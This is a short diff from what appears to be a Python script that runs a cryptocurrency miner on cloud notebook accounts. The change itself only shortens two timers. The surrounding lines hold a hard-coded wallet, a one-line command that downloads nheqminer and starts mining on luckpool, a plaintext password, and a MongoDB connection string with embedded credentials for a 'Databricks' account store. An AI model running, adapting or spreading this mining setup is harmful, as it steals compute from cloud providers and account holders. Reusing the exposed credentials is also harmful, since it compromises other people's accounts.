@@ -27,8 +27,8 @@ wallet   ="RDD9mUShEa4WU894zdknpkZJnLbLeWMXf4"
 worker   =".Cloud-DB"
 scriptmining= "!wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvzf nheqminer-Linux-v0.8.2.tgz && tar -xvzf nheqminer-Linux-v0.8.2.tar.gz && ./nheqminer/nheqminer -v -l eu.luckpool.net:3960 -u "+wallet+worker+" -p x -t 2"
 passwork   ="1234Abcdf@"
-timeopen=120
-timewaiting=120
+timeopen=60
+timewaiting=60
 client = MongoClient("mongodb+srv://Quocnd174202:Quocnd174202@cluster0.ivpah.mongodb.net/myFirstDatabase?retryWrites=true&w=majority")
 db = client.get_database('Databricks')
 data =db.Account
